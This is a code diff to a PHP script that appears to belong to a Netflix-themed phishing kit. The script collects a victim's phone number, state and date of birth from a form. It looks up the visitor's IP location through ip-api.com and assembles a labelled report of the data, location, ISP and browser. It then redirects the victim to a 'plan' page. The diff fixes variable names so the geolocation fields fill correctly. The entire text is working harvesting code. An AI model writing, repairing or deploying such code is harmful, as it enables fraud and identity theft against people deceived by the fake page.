@@ -43,7 +43,6 @@ $_SESSION['city'] = $_POST['city'];
 $_SESSION['state'] = $_POST['state'];
 $_SESSION['phone'] = $_POST['phone'];
 $_SESSION['birthday'] = $_POST['birthday'];
-$_SESSION['phonelastnum'] = $phonelastnum;
 
 $IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
 $country      = $data->country ?? 'Unknown';
@@ -71,7 +70,7 @@ $message .= "[+] State        : ".$_POST['state']."\r\n";
 $message .= "[+] Phone      	 : ".$_POST['phone']."\r\n";
 $message .= "[+] Date of birth 🎂       : ".$_POST['birthday']."\r\n";
 $message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
-$message .= "[+] IP : " .$ip."\n[+] Country : ".$COUNTRY."[+] City: " .$CITY."[+] Region : " .$REGION."[+] State: " .$STATE."[+] Zip : " .$ZIPCODE."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
+$message .= "[+] IP : " .$ip."\n[+] Country : ".$country."[+] City: " .$city."[+] Region : " .$region."[+] State: " .$regionName."[+] Zip : " .$zip."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
 $message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
 $message .= "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\n";
 
@@ -91,4 +90,5 @@ HEADER("Location: ../plan.php");
 
 
 ?>
+
 
